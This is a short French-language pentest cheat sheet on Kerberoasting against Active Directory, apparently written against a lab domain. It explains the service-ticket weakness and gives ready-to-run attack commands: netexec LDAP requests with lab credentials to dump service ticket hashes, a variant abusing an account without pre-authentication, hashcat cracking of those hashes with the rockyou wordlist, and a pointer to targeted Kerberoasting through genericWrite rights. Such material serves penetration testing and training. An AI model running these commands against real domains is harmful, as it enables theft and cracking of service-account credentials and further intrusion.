# Kerberoasting

> Attaque sur l’étape **KRB\_TGS\_REP**\
> Nécessite un compte utilisateur sans privilèges particulier\
> Basé sur le mécanisme de ticket de service\
> N’importe quel utilisateur du domaine peut demander un ticket de service pour un compte possédant un SPN (Service Principal Name) à partir de son TGT\
> Le KDC va alors vérifier la validité du TGT en le déchiffrant et répondre avec un message KRB\_TGS\_REP dont une partie de la réponse est chiffrée avec le hash du compte de service.\
> La réponse peut être ensuite cassée hors-ligne.

### Extraction

```bash
nxc ldap 192.168.56.11 -u 'brandon.stark' -p 'iseedeadpeople' --kerberoasting kerberoasting.txt
```

### Kerberoasting via AS-REP Roasting <a href="#kerberoasting-via-as-rep-roasting" id="kerberoasting-via-as-rep-roasting"></a>

> You can also perform Kerberoasting by leveraging an AS-REP roastable account that does not require pre-authentication. This is possible by combining `--no-preauth-targets` and `--kerberoasting`.

```bash
nxc ldap 192.168.56.11 -u harry -p '' --no-preauth-targets kerberoastable.list --kerberoasting output.txt
```

* `-u`: AS-REP roastable user (no pre-auth required).
* `--no-preauth-targets`: Single user or file containing list of users to target with Kerberoasting.

### Cracker les hashs hors-ligne

```bash
hashcat -m13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt
```

### Targeted Kerberoasting

Si on possède un compte avec les droits genericWrite (ou genericAll), on peut alors ajouter un SPN à un compte n'en possédant pas déjà pour le rendre vulnérable à cette attaque
